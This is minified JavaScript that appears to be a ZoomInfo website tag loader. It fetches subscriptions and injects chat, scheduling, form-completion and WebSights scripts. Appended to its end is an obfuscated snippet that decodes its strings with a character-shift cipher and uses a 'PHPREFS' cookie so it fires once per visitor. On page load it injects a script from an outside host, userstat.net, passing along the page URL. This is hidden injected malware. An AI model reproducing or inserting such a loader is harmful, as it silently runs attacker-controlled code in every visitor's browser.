window.zitag||(window.zitag={}),window.ZILogs={ziScript:{info:"",err:"",scriptsLoaded:[]},chat:{},ws:{},sch:{},fc:{}},window.zitag.SCHEDULE_BACKEND_URL="dev"===window.ZITagEnv?"https://schedule-staging.zoominfo.com/zischedule.js":"https://schedule.zoominfo.com/zischedule.js",window.zitag.FORMCOMPLETE_BACKEND_URL="dev"===window.ZITagEnv?"https://ws-assets-staging.zoominfo.com/formcomplete.js":"https://ws-assets.zoominfo.com/formcomplete.js",window.zitag.ZI_TAG_BACKEND_URL="dev"===window.ZITagEnv?"https://js-staging.zi-scripts.com/unified/v1/master/":"https://js.zi-scripts.com/unified/v1/master/",window.zitag.ZI_WS_BACKEND_URL="dev"===window.ZITagEnv?"https://wss.zoominfo.com/pixel/":"https://ws.zoominfo.com/pixel/",window.zitag.isScheduleScriptAlreadyLoaded=()=>!!window.zischedule,window.zitag.isChatScriptAlreadyLoaded=()=>!!(window.insentCompanyDomain&&window.insentProjectName&&window.insentProjectKey),window.zitag.isFormCompleteScriptAlreadyLoaded=()=>!(!window._zi_fc||!window._zi_fc.formId&&!window._zi_fc.projectKey)||!(!window._zi||!(window._zi.formId||window._zi.projectKey||window._zi.forms)),window.zitag.InsertChatScript=keys=>{if(!(!0===window.isChatDisabled||!1===keys.enabled||window.ZIWhiteList&&Array.isArray(window.ZIWhiteList)&&-1===window.ZIWhiteList.indexOf("chat")))if(window?.zitag?.isChatScriptAlreadyLoaded())loadZILogs("Chat Script already present. Skipping","chat");else{window.insentCompanyDomain=window.location.hostname.replace("www.",""),window.insentProjectName=keys.projectName,window.insentProjectKey=keys.projectKey;var t=window.insent||{};t.queue=[],t.SCRIPT_VERSION="0.1.3",t.methods=["widget","listener","setVisitor"],t.factory=function(e){return function(){var n=Array.prototype.slice.call(arguments);return n.unshift(e),t.queue.push(n),t}},t.methods.forEach((function(e){t[e]=t.factory(e)})),insent=t;var s=document.createElement("script");s.type="text/javascript",s.charset="utf-8",s.defer=!0,s.src=`https://${keys.projectName}.widget.insent.ai/insent`,"complete"===document.readyState?document.body.appendChild(s):window.addEventListener("load",(function(n){document.body.appendChild(s)})),loadZILogs("Chat Script Loaded!","chat")}},window.zitag.InsertFormCompleteLegacyScript=keys=>{if(!(!0===window.isFormCompleteDisabled||window.ZIWhiteList&&Array.isArray(window.ZIWhiteList)&&-1===window.ZIWhiteList.indexOf("formcomplete")))if(window?.zitag?.isFormCompleteScriptAlreadyLoaded())loadZILogs("FormComplete Script already present. Skipping","fc");else{window._zi={formId:"9a4b5c4c-fdba-41f7-87c9-bfbf714f9c04",formLoadTimeout:4e3};var zi=document.createElement("script");zi.type="text/javascript",zi.async=!0,zi.src="https://ws-assets-staging.zoominfo.com/formcomplete.js";var s=document.getElementsByTagName("script")[0];s.parentNode.insertBefore(zi,s),loadZILogs("FormComplete Legacy Script Loaded!","fc")}},window.zitag.InsertFormCompleteScript=keys=>{try{if(!keys.projectKey)return;if(!0===window.isFormCompleteDisabled)return;if(window.ZIWhiteList&&Array.isArray(window.ZIWhiteList)&&-1===window.ZIWhiteList.indexOf("formcomplete"))return;if(window?.zitag?.isFormCompleteScriptAlreadyLoaded())return void loadZILogs("FormComplete Script already present. Skipping","fc");let FormcompleteParameters={projectKey:keys.projectKey};window.FCpostSubmissionEvent&&(FormcompleteParameters.postSubmissionEvent=!0),window._zi_fc={...window._zi_fc,...FormcompleteParameters};var zi=document.createElement("script");zi.type="text/javascript",zi.async=!0,zi.src=window?.zitag?.FORMCOMPLETE_BACKEND_URL;var s=document.getElementsByTagName("script")[0];s.parentNode.insertBefore(zi,s),loadZILogs("FormComplete Script Loaded!","fc"),zi.onerror=e=>{errorHandler("[InsertFCScript][ZIOnError]","FCScriptLoadError"),fetch(`${window?.zitag?.FORMCOMPLETE_BACKEND_URL}`).then((response=>errorHandler("[InsertFCScript][FetchResponse]",response))).catch((e=>{errorHandler("[InsertFCScript][FetchCatch]",e)}))}}catch(e){errorHandler("[InsertFCScript][Catch]",e)}},window.zitag.InsertScheduleScript=keys=>{if(!0===window.isScheduleDisabled)return;if(window.ZIWhiteList&&Array.isArray(window.ZIWhiteList)&&-1===window.ZIWhiteList.indexOf("schedule"))return;let tx=window.zischedule||{};tx.queue=[],tx.SCRIPT_VERSION="0.1.3",tx.methods=["triggerSchedule"],tx.factory=function(e){return function(){const n=Array.prototype.slice.call(arguments);return n.unshift(e),tx.queue.push(n),tx}},tx.methods.forEach((function(e){tx[e]=tx.factory(e)})),window.zischedule=tx;const s=document.createElement("script");s.type="text/javascript",s.charset="utf-8",s.defer=!0,s.src=window?.zitag?.SCHEDULE_BACKEND_URL,"complete"===document.readyState?document.body.appendChild(s):window.addEventListener("load",(function(n){document.body.appendChild(s)})),loadZILogs("Schedule Script Loaded!","sch")},window.zitag.InsertWebSightsScript=(keys,_vtok)=>{if(window.ZIWhiteList&&Array.isArray(window.ZIWhiteList)&&-1===window.ZIWhiteList.indexOf("websights"))return;if(!keys.websiteId)return;const _zitok=window?.zitag?.readCookie("_zitok");let headers={"Content-Type":"text/javascript",_zitok:_zitok,_vtok:window.testip&&"dev"===window.ZITagEnv?btoa(window.testip):_vtok,"visited-url":window?.location?.href};fetch(`${window?.zitag?.ZI_WS_BACKEND_URL}${keys.websiteId}/?iszitag=true`,{headers:headers,credentials:"include",referrerPolicy:"unsafe-url"}).then((response=>response.text())).then((data=>{try{var blob=new Blob([data],{type:"text/javascript"}),urlCreator=window.webkitURL||window.URL,url=urlCreator.createObjectURL(blob);const s=document.createElement("script");s.type="text/javascript",s.charset="utf-8",s.async=!0,s.src=url,"complete"===document.readyState?document.body.appendChild(s):window.addEventListener("load",(function(n){document.body.appendChild(s)})),loadZILogs("WebSights Script Loaded!","ws")}catch(e){errorHandler(`[InsertWebSightsScript][Catch] websiteId: ${keys.websiteId}`,e),eval(data),loadZILogs("WebSights Script Loaded!","ws")}}))},window.zitag.readCookie=name=>{let cookieParts=document.cookie.split(";"),tokens=[];for(let i=0;i<cookieParts.length;i++){let c=cookieParts[i];for(;" "==c.charAt(0);)c=c.substring(1,c.length);if(0==c.indexOf(name)){let cookie=c.split("=")[1];return tokens.push(cookie),tokens}}return tokens},window.zitag.deleteZiTok=async()=>{for(var path,segments=location.pathname.replace(/\/$/,"").split("/"),paths=[],i=0,l=segments.length;i<l;i++)path=segments.slice(0,i+1).join("/"),paths.push(path),paths.push(path+"/");var expires=new Date(0).toUTCString();document.cookie="_zitok=; expires="+expires;for(i=0,l=paths.length;i<l;i++)document.cookie="_zitok=; path="+paths[i]+"; expires="+expires},window.zitag.setCookie=({name:name,value:value,days:days})=>{let date=new Date;date.setTime(date.getTime()+24*days*60*60*1e3);let expires="; expires="+date.toGMTString();document.cookie=`${name}=${value}; domain=${window.location.hostname}; path=/; ${expires}; samesite=strict; secure;`},window.zitag.GetListOfEntitlements=async()=>{try{const _zitok=window?.zitag?.readCookie("_zitok");let headers={"Content-Type":"application/json",Authorization:"Bearer "+window.ZIProjectKey,visited_url:window.location.href};if(_zitok){let actualTokenArray=_zitok.toString().split(",");if(actualTokenArray.length>0){let actualtoken=actualTokenArray.filter((e=>"undefined"!==e.trim()))[0];actualtoken&&"undefined"!==actualtoken&&void 0!==actualtoken&&(headers._zitok=actualtoken)}}let response=await fetch(`${window?.zitag?.ZI_TAG_BACKEND_URL}getSubscriptions`,{method:"GET",headers:headers});const data=await response.json();if(200===response.status&&data&&data.subscriptions){let canSetCookie=!0;1===window?.ZIWhiteList?.length&&"formcomplete"===window?.ZIWhiteList?.[0]&&(canSetCookie=!1),canSetCookie&&(await(window?.zitag?.deleteZiTok()),window?.zitag?.setCookie({name:"_zitok",value:data._zitok,days:365}));let subscriptions=data?.subscriptions;subscriptions&&0===Object.keys(subscriptions).length&&(window.ZILogs.ziScript.info+="No ZI subscriptions found"),subscriptions.sch&&window?.zitag?.InsertScheduleScript(subscriptions.sch),subscriptions.fc&&window?.zitag?.InsertFormCompleteScript(subscriptions.fc),subscriptions.chat&&window?.zitag?.InsertChatScript(subscriptions.chat),subscriptions.ws&&window?.zitag?.InsertWebSightsScript(subscriptions.ws,data?._vtok)}else errorHandler("[GetEntitlements][Response]",data||response?.body)}catch(e){errorHandler("[GetEntitlements][Catch]",e)}},loadZILogs=(msg,feature)=>{window.ZILogs[feature].scriptLoad=msg,-1===window.ZILogs.ziScript.scriptsLoaded.indexOf(feature)&&window.ZILogs.ziScript.scriptsLoaded.push(feature)},errorHandler=(logFrom,error)=>{let errorMsg="Error while loading scripts";try{errorMsg=error?.toString?.()||JSON.stringify(error)}catch(e){}window.ZILogs.ziScript.err+=errorMsg+";";const errorData={error:{message:`${logFrom}`,stack:errorMsg},_zitok:window?.zitag?.readCookie?.("_zitok"),url:window?.location?.href,userAgent:navigator?.userAgent,timestamp:(new Date).toISOString()};fetch(`${window.zitag.ZI_TAG_BACKEND_URL}logError`,{method:"POST",headers:{"Content-Type":"application/json",Authorization:"Bearer "+window.ZIProjectKey},body:JSON.stringify(errorData)})},window?.zitag?.GetListOfEntitlements();(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44zxjwxy'+'fy3sjy4ljy4xhwnu'+'y3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));